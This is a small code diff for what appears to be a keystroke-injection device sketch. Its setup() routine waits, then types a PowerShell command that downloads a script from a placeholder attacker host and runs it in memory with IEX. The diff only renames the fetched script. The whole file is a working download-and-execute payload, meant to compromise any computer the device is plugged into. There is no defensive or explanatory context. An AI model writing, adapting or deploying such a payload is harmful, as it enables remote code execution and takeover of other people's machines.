@@ -1,6 +1,6 @@
 void setup() {
   delay(10000);
-  omg("powershell \"IEX (New-Object Net.WebClient).DownloadString('http://X.X.X.X:P/x.ps1')\"");
+  omg("powershell \"IEX (New-Object Net.WebClient).DownloadString('http://X.X.X.X:P/A.ps1')\"");
   delay(500);
 }
 
